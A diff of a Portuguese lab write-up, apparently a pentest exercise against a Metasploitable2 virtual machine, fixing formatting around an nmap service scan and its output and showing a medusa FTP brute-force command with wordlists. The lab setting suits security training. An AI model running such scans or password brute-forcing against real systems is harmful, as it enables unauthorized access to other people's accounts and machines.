@@ -16,7 +16,8 @@ Rede Host-only
 
 Comando:
 ```nmap -sV -p 21,22,80,445,139 192.168.56.101``` | 21,22,80,445,139 se refere as portas que quero acessar verificar | 192.168.56.101 se refere ao ip do Metasploitble2
-Resultado: ```
+Resultado: 
+```
 Nmap scan report for 192.168.56.101
 Host is up (0.0044s latency).
 PORT |  STATE SERVICE | VERSION
@@ -26,7 +27,9 @@ PORT |  STATE SERVICE | VERSION
 139/tcp | open | netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp | open | netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 MAC Address: ********** (Oracle VirtualBox virtual NIC)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
 ## 💥 Ataque FTP
 
 Comando: ```medusa -h IP -U usuarios.txt -P senhas.txt -M ftp -t 6```
